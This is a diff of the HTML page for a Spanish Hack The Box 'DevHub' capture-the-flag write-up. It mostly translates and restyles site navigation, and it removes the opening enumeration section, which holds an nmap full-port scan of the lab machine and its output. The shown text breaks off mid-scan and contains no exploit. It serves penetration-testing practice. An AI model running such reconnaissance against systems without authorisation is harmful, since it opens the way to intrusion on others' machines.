@@ -1,14 +1,18 @@
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="es" class="no-js">
   <head>
     
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width,initial-scale=1">
       
+        <meta name="description" content="Write-ups de Hack The Box y guías de hardening">
       
       
-        <link rel="canonical" href="https://d4vKry.github.io/HTB/Medium/DevHub/">
+        <meta name="author" content="D4vKry">
+      
+      
+        <link rel="canonical" href="https://d4vkry.github.io/HTB/Medium/DevHub/">
       
       
         <link rel="prev" href="../Checkpoint/">
@@ -20,12 +24,12 @@
         
       
       
-      <link rel="icon" href="../../../assets/images/favicon.png">
+      <link rel="icon" href="../../../assets/images/logo.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
     
     
       
-        <title>DevHub - Linux - D4vKry's Portfolio</title>
+        <title>DevHub - D4vKry</title>
       
     
     
@@ -46,10 +50,12 @@
         
         
         <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
-        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
       
     
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/extra.css">
     
     <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -65,7 +71,7 @@
     
     
     
-    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="cyan">
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
   
     
     <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
@@ -74,8 +80,8 @@
     <div data-md-component="skip">
       
         
-        <a href="#htb-devhub" class="md-skip">
-          Skip to content
+        <a href="#devhub" class="md-skip">
+          Saltar a contenido
         </a>
       
     </div>
@@ -89,11 +95,10 @@
   
 
 <header class="md-header md-header--shadow" data-md-component="header">
-  <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../.." title="D4vKry&#39;s Portfolio" class="md-header__button md-logo" aria-label="D4vKry's Portfolio" data-md-component="logo">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../../.." title="D4vKry" class="md-header__button md-logo" aria-label="D4vKry" data-md-component="logo">
       
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <img src="../../../assets/images/logo.svg" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -104,13 +109,13 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            D4vKry's Portfolio
+            D4vKry
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              DevHub - Linux
+              DevHub
             
           </span>
         </div>
@@ -132,27 +137,29 @@
   <label class="md-search__overlay" for="__search"></label>
   <div class="md-search__inner" role="search">
     <form class="md-search__form" name="search">
-      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
       <label class="md-search__icon md-icon" for="__search">
         
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
         
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
       </label>
-      <nav class="md-search__options" aria-label="Search">
+      <nav class="md-search__options" aria-label="Buscar">
         
-        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
           
           <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
         </button>
       </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
       
     </form>
     <div class="md-search__output">
       <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
         <div class="md-search-result" data-md-component="search-result">
           <div class="md-search-result__meta">
-            Initializing search
+            Inicializando búsqueda
           </div>
           <ol class="md-search-result__list" role="presentation"></ol>
         </div>
@@ -186,15 +193,14 @@
 
 
 
-<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../.." title="D4vKry&#39;s Portfolio" class="md-nav__button md-logo" aria-label="D4vKry's Portfolio" data-md-component="logo">
+    <a href="../../.." title="D4vKry" class="md-nav__button md-logo" aria-label="D4vKry" data-md-component="logo">
       
-  
-  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+  <img src="../../../assets/images/logo.svg" alt="logo">
 
     </a>
-    D4vKry's Portfolio
+    D4vKry
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -236,15 +242,20 @@
     
     
     
+      
+        
+        
+      
     
-    <li class="md-nav__item md-nav__item--nested">
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
       
         
         
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
         
           
-          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
             
   
   
@@ -284,6 +295,8 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6.85 6.74q.015 0 0 0M21.28 8.6c-.43-1.05-1.32-2.18-2.01-2.54.56 1.11.89 2.22 1.02 3.04v.02c-1.13-2.82-3.05-3.96-4.62-6.44-.08-.12-.17-.25-.24-.38-.04-.07-.07-.14-.11-.21-.06-.13-.12-.26-.15-.4 0-.01-.01-.02-.02-.02h-.03c-2.22 1.3-3.15 3.59-3.38 5.04-.69.04-1.37.21-1.99.51-.12.05-.17.19-.13.31.05.14.21.21.34.15.54-.26 1.14-.41 1.74-.45h.05c.08-.01.17-.01.25-.01.5-.01.97.06 1.44.2l.06.02c.1.02.17.06.25.06.05.04.11.06.16.08l.14.06c.07.03.14.06.2.09.03.02.06.03.09.05.07.04.16.07.2.11.04.02.08.05.12.07.73.45 1.34 1.07 1.75 1.81-.53-.37-1.49-.74-2.41-.58 3.6 1.81 2.63 8-2.36 7.76-.44-.01-.88-.1-1.3-.25-.1-.03-.2-.07-.29-.12-.05-.02-.12-.05-.17-.08-1.23-.63-2.24-1.82-2.38-3.27 0 0 .5-1.73 3.33-1.73.31 0 1.17-.86 1.2-1.1 0-.09-1.74-.78-2.42-1.45-.37-.36-.54-.53-.69-.66-.08-.07-.17-.13-.26-.19a4.63 4.63 0 0 1-.03-2.45C7.6 6.12 6.8 6.86 6.22 7.5c-.4-.5-.37-2.15-.35-2.5-.01 0-.3.16-.33.18-.35.25-.68.53-.98.82-.35.37-.66.74-.94 1.14-.62.91-1.12 1.95-1.34 3.04 0 .01-.1.41-.17.92l-.03.23c-.02.17-.04.32-.08.58v.41c0 5.53 4.5 10.01 10 10.01 4.97 0 9.08-3.59 9.88-8.33.02-.11.03-.24.05-.37.2-1.72-.02-3.52-.65-5.03"/></svg>
+  
   <span class="md-ellipsis">
     
   
@@ -320,22 +333,27 @@
     
     
     
+      
+        
+        
+      
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
       
         
         
         <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
         
           
-          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
             
   
   
   <span class="md-ellipsis">
     
   
-    Hack The Box - WriteUps
+    Hack The Box
   
 
     
@@ -351,7 +369,7 @@
             <span class="md-nav__icon md-icon"></span>
             
   
-    Hack The Box - WriteUps
+    Hack The Box
   
 
           </label>
@@ -366,6 +384,8 @@
     
     
     
+    
+      
     
     
     <li class="md-nav__item md-nav__item--nested">
@@ -415,10 +435,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Connected - Linux
+    Connected
   
 
     
@@ -443,10 +465,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Enigma - Linux
+    Enigma
   
 
     
@@ -471,10 +495,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    Nexus - Linux
+    Nexus
   
 
     
@@ -507,6 +533,8 @@
     
     
     
+    
+      
     
     
     <li class="md-nav__item md-nav__item--active md-nav__item--nested">
@@ -556,10 +584,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Checkpoint - Windows
+    Checkpoint
   
 
     
@@ -593,10 +623,12 @@
           
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    DevHub - Linux
+    DevHub
   
 
     
@@ -611,10 +643,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.62 8.35c-.42.28-1.75 1.04-1.95 1.19-.39.31-.75.29-1.14-.01-.2-.16-1.53-.92-1.95-1.19-.48-.31-.45-.7.08-.92 1.64-.69 3.28-.64 4.91.03.49.21.51.6.05.9m7.22 7.28c-.93-2.09-2.2-3.99-3.84-5.66a4.3 4.3 0 0 1-1.06-1.88c-.1-.33-.17-.67-.24-1.01-.2-.88-.29-1.78-.7-2.61-.73-1.58-2-2.4-3.84-2.47-1.81.05-3.16.81-3.95 2.4-.21.43-.36.88-.46 1.34-.17.76-.32 1.55-.5 2.32-.15.65-.45 1.21-.96 1.71-1.61 1.57-2.9 3.37-3.88 5.35-.14.29-.28.58-.37.88-.19.66.29 1.12.99.96.44-.09.88-.18 1.3-.31.41-.15.57-.05.67.35.65 2.15 2.07 3.66 4.24 4.5 4.12 1.56 8.93-.66 9.97-4.58.07-.27.17-.37.47-.27.46.14.93.24 1.4.35.49.09.85-.16.92-.64.03-.26-.06-.49-.16-.73"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    DevHub - Linux
+    DevHub
   
 
     
@@ -626,7 +660,7 @@
       
         
 
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
   
   
   
@@ -635,7 +669,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table of contents
+      Tabla de contenidos
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -833,6 +867,8 @@
     
     
     
+      
+    
     
     <li class="md-nav__item md-nav__item--nested">
       
@@ -881,10 +917,12 @@
         
   
   
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 17a2 2 0 0 1-2-2c0-1.11.89-2 2-2a2 2 0 0 1 2 2 2 2 0 0 1-2 2m6 3V10H6v10zm0-12a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V10c0-1.11.89-2 2-2h1V6a5 5 0 0 1 5-5 5 5 0 0 1 5 5v2zm-6-5a3 3 0 0 0-3 3v2h6V6a3 3 0 0 0-3-3"/></svg>
+  
   <span class="md-ellipsis">
     
   
-    🔒Nimbus - Linux
+    Nimbus
   
 
     
@@ -926,7 +964,7 @@
                   <div class="md-sidebar__inner">
                     
 
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
   
   
   
@@ -935,7 +973,7 @@
   
     <label class="md-nav__title" for="__toc">
       <span class="md-nav__icon md-icon"></span>
-      Table of contents
+      Tabla de contenidos
     </label>
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
@@ -1122,103 +1160,118 @@
                   
 
 
+  
 
-<h1 id="htb-devhub">HTB | DevHub</h1>
-<p><strong>Machine</strong> - DevHub
-<strong>OS</strong> - Linux
-<strong>Difficulty</strong> - Medium
-<strong>IP</strong> - 10.129.3.242
-<strong>Fecha</strong> - 1/6/2026</p>
+<div class="dk-machine">
+  <div class="dk-machine__row">
+    <span class="dk-badge dk-badge--platform">Hack The Box</span>
+    <span class="dk-badge dk-badge--medium">Medium</span>
+    <span class="dk-badge dk-badge--os">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M220.9 123.3c1 .5 1.8 1.7 3 1.7 1.1 0 2.8-.4 2.9-1.5.2-1.4-1.9-2.3-3.2-2.9-1.7-.7-3.9-1-5.5-.1-.4.2-.8.7-.6 1.1.3 1.3 2.3 1.1 3.4 1.7M199 125c1.2 0 2-1.2 3-1.7 1.1-.6 3.1-.4 3.5-1.6.2-.4-.2-.9-.6-1.1-1.6-.9-3.8-.6-5.5.1-1.3.6-3.4 1.5-3.2 2.9.1 1 1.8 1.5 2.8 1.4m221 278.8c-3.6-4-5.3-11.6-7.2-19.7-1.8-8.1-3.9-16.8-10.5-22.4-1.3-1.1-2.6-2.1-4-2.9-1.3-.8-2.7-1.5-4.1-2 9.2-27.3 5.6-54.5-3.7-79.1-11.4-30.1-31.3-56.4-46.5-74.4-17.1-21.5-33.7-41.9-33.4-72C311.1 85.4 315.7.1 234.8 0 132.4-.2 158 103.4 156.9 135.2c-1.7 23.4-6.4 41.8-22.5 64.7-18.9 22.5-45.5 58.8-58.1 96.7-6 17.9-8.8 36.1-6.2 53.3-6.5 5.8-11.4 14.7-16.6 20.2-4.2 4.3-10.3 5.9-17 8.3s-14 6-18.5 14.5c-2.1 3.9-2.8 8.1-2.8 12.4 0 3.9.6 7.9 1.2 11.8 1.2 8.1 2.5 15.7.8 20.8-5.2 14.4-5.9 24.4-2.2 31.7 3.8 7.3 11.4 10.5 20.1 12.3 17.3 3.6 40.8 2.7 59.3 12.5 19.8 10.4 39.9 14.1 55.9 10.4 11.6-2.6 21.1-9.6 25.9-20.2 12.5-.1 26.3-5.4 48.3-6.6 14.9-1.2 33.6 5.3 55.1 4.1.6 2.3 1.4 4.6 2.5 6.7v.1c8.3 16.7 23.8 24.3 40.3 23 16.6-1.3 34.1-11 48.3-27.9 13.6-16.4 36-23.2 50.9-32.2 7.4-4.5 13.4-10.1 13.9-18.3.4-8.2-4.4-17.3-15.5-29.7M223.8 87.3c9.8-22.2 34.2-21.8 44-.4 6.5 14.2 3.6 30.9-4.3 40.4-1.6-.8-5.9-2.6-12.6-4.9 1.1-1.2 3.1-2.7 3.9-4.6 4.8-11.8-.2-27-9.1-27.3-7.3-.5-13.9 10.8-11.8 23-4.1-2-9.4-3.5-13-4.4-1-6.9-.3-14.6 2.9-21.8m-40.7-11.5c10.1 0 20.8 14.2 19.1 33.5-3.5 1-7.1 2.5-10.2 4.6 1.2-8.9-3.3-20.1-9.6-19.6-8.4.7-9.8 21.2-1.8 28.1 1 .8 1.9-.2-5.9 5.5-15.6-14.6-10.5-52.1 8.4-52.1m-13.6 60.7c6.2-4.6 13.6-10 14.1-10.5 4.7-4.4 13.5-14.2 27.9-14.2 7.1 0 15.6 2.3 25.9 8.9 6.3 4.1 11.3 4.4 22.6 9.3 8.4 3.5 13.7 9.7 10.5 18.2-2.6 7.1-11 14.4-22.7 18.1-11.1 3.6-19.8 16-38.2 14.9-3.9-.2-7-1-9.6-2.1-8-3.5-12.2-10.4-20-15-8.6-4.8-13.2-10.4-14.7-15.3q-2.1-7.35 4.2-12.3m3.3 334c-2.7 35.1-43.9 34.4-75.3 18-29.9-15.8-68.6-6.5-76.5-21.9-2.4-4.7-2.4-12.7 2.6-26.4v-.2c2.4-7.6.6-16-.6-23.9-1.2-7.8-1.8-15 .9-20 3.5-6.7 8.5-9.1 14.8-11.3 10.3-3.7 11.8-3.4 19.6-9.9 5.5-5.7 9.5-12.9 14.3-18 5.1-5.5 10-8.1 17.7-6.9 8.1 1.2 15.1 6.8 21.9 16l19.6 35.6c9.5 19.9 43.1 48.4 41 68.9m-1.4-25.9c-4.1-6.6-9.6-13.6-14.4-19.6 7.1 0 14.2-2.2 16.7-8.9 2.3-6.2 0-14.9-7.4-24.9-13.5-18.2-38.3-32.5-38.3-32.5-13.5-8.4-21.1-18.7-24.6-29.9s-3-23.3-.3-35.2c5.2-22.9 18.6-45.2 27.2-59.2 2.3-1.7.8 3.2-8.7 20.8-8.5 16.1-24.4 53.3-2.6 82.4.6-20.7 5.5-41.8 13.8-61.5 12-27.4 37.3-74.9 39.3-112.7 1.1.8 4.6 3.2 6.2 4.1 4.6 2.7 8.1 6.7 12.6 10.3 12.4 10 28.5 9.2 42.4 1.2 6.2-3.5 11.2-7.5 15.9-9 9.9-3.1 17.8-8.6 22.3-15 7.7 30.4 25.7 74.3 37.2 95.7 6.1 11.4 18.3 35.5 23.6 64.6 3.3-.1 7 .4 10.9 1.4 13.8-35.7-11.7-74.2-23.3-84.9-4.7-4.6-4.9-6.6-2.6-6.5 12.6 11.2 29.2 33.7 35.2 59 2.8 11.6 3.3 23.7.4 35.7 16.4 6.8 35.9 17.9 30.7 34.8-2.2-.1-3.2 0-4.2 0 3.2-10.1-3.9-17.6-22.8-26.1-19.6-8.6-36-8.6-38.3 12.5-12.1 4.2-18.3 14.7-21.4 27.3-2.8 11.2-3.6 24.7-4.4 39.9-.5 7.7-3.6 18-6.8 29-32.1 22.9-76.7 32.9-114.3 7.2m257.4-11.5c-.9 16.8-41.2 19.9-63.2 46.5-13.2 15.7-29.4 24.4-43.6 25.5s-26.5-4.8-33.7-19.3c-4.7-11.1-2.4-23.1 1.1-36.3 3.7-14.2 9.2-28.8 9.9-40.6.8-15.2 1.7-28.5 4.2-38.7 2.6-10.3 6.6-17.2 13.7-21.1.3-.2.7-.3 1-.5.8 13.2 7.3 26.6 18.8 29.5 12.6 3.3 30.7-7.5 38.4-16.3 9-.3 15.7-.9 22.6 5.1 9.9 8.5 7.1 30.3 17.1 41.6 10.6 11.6 14 19.5 13.7 24.6M173.4 148.7c2 1.9 4.7 4.5 8 7.1 6.6 5.2 15.8 10.6 27.3 10.6 11.6 0 22.5-5.9 31.8-10.8 4.9-2.6 10.9-7 14.8-10.4s5.9-6.3 3.1-6.6-2.6 2.6-6 5.1c-4.4 3.2-9.7 7.4-13.9 9.8-7.4 4.2-19.5 10.2-29.9 10.2s-18.7-4.8-24.9-9.7c-3.1-2.5-5.7-5-7.7-6.9-1.5-1.4-1.9-4.6-4.3-4.9-1.4-.1-1.8 3.7 1.7 6.5"/></svg>
+      
+      Linux
+    </span>
+    
+  </div>
+  <dl class="dk-machine__meta">
+    <div><dt>IP</dt><dd><code>10.129.3.242</code></dd></div>
+    <div><dt>Fecha</dt><dd>01/06/2026</dd></div>
+    
+  </dl>
+</div>
+
+<h1 id="devhub">DevHub<a class="headerlink" href="#devhub" title="Permanent link">&para;</a></h1>
 <p><img alt="hecho" src="hecho.png" /></p>
 <hr />
-<h2 id="1-enumeracion-reconnaissance">1. Enumeración (Reconnaissance)</h2>
-<h3 id="escaneo-de-puertos-nmap">Escaneo de Puertos (Nmap)</h3>
+<h2 id="1-enumeracion-reconnaissance">1. Enumeración (Reconnaissance)<a class="headerlink" href="#1-enumeracion-reconnaissance" title="Permanent link">&para;</a></h2>
+<h3 id="escaneo-de-puertos-nmap">Escaneo de Puertos (Nmap)<a class="headerlink" href="#escaneo-de-puertos-nmap" title="Permanent link">&para;</a></h3>
 <p>Comenzamos la fase de reconocimiento realizando un escaneo de puertos exhaustivo sobre la máquina objetivo. El objetivo es identificar todos los puertos abiertos (<code>-p-</code>), determinar los servicios y versiones que corren en ellos (<code>-sCV</code>), y hacerlo de la manera más rápida posible enviando no menos de 5000 paquetes por segundo (<code>--min-rate=5000</code>).</p>
-<pre><code class="language-bash">nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.3.242
-</code></pre>
-<pre><code class="language-text"># Nmap 7.99 scan initiated Mon Jun  1 06:39:28 2026 as: nmap -sCV -p- --min-rate=5000 -oN nmap.txt 10.129.3.242
-Nmap scan report for devhut.htb (10.129.3.242)
-Host is up (0.045s latency).
-Not shown: 65532 filtered tcp ports (no-response)
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
-|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
-80/tcp   open  http    nginx 1.18.0 (Ubuntu)
-|_http-title: Did not follow redirect to http://devhub.htb/
-|_http-server-header: nginx/1.18.0 (Ubuntu)
-6274/tcp open  unknown
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
-|     HTTP/1.1 400 Bad Request
-|     Connection: close
-|   GetRequest: 
-|     HTTP/1.1 200 OK
-|     access-control-allow-credentials: true
-|     content-length: 466
-|     content-type: text/html; charset=utf-8
-|     vary: Origin
-|     Date: Mon, 01 Jun 2026 06:40:06 GMT
-|     Connection: close
-|     &lt;!doctype html&gt;
-|     &lt;html lang=&quot;en&quot;&gt;
-|     &lt;head&gt;
-|     &lt;meta charset=&quot;UTF-8&quot; /&gt;
-|     &lt;link rel=&quot;icon&quot; type=&quot;image/svg+xml&quot; href=&quot;/mcp_jam.svg&quot; /&gt;
-|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot; /&gt;
-|     &lt;title&gt;MCPJam Inspector&lt;/title&gt;
-|     &lt;script type=&quot;module&quot; crossorigin src=&quot;/assets/index-DRYhT9Xb.js&quot;&gt;&lt;/script&gt;
-|     &lt;link rel=&quot;stylesheet&quot; crossorigin href=&quot;/assets/index-XvFRNbCs.css&quot;&gt;
-|     &lt;/head&gt;
-|     &lt;body&gt;
-|     &lt;div id=&quot;root&quot;&gt;&lt;/div&gt;
-|     &lt;/body&gt;
-|     &lt;/html&gt;
-|   HTTPOptions, RTSPRequest: 
-|     HTTP/1.1 204 No Content
-|     access-control-allow-credentials: true
-|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
-|     vary: Origin
-|     content-type: text/plain; charset=UTF-8
-|     Date: Mon, 01 Jun 2026 06:40:06 GMT
-|_    Connection: close
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port6274-TCP:V=7.99%I=7%D=6/1%Time=6A1D2946%P=x86_64-pc-linux-gnu%r(Get
-SF:Request,290,&quot;HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
-SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
-SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Mon,\x2001\x20Jun\x202026\x
-SF:2006:40:06\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;!doctype\x20html&gt;\n&lt;h
-SF:tml\x20lang=\&quot;en\&quot;&gt;\n\x20\x20&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\
-SF:&quot;UTF-8\&quot;\x20/&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;icon\&quot;\x20type=\&quot;image/s
-SF:vg\+xml\&quot;\x20href=\&quot;/mcp_jam\.svg\&quot;\x20/&gt;\n\x20\x20\x20\x20&lt;meta\x20nam
-SF:e=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1\.0\&quot;
-SF:\x20/&gt;\n\x20\x20\x20\x20&lt;title&gt;MCPJam\x20Inspector&lt;/title&gt;\n\x20\x20\x2
-SF:0\x20&lt;script\x20type=\&quot;module\&quot;\x20crossorigin\x20src=\&quot;/assets/index-D
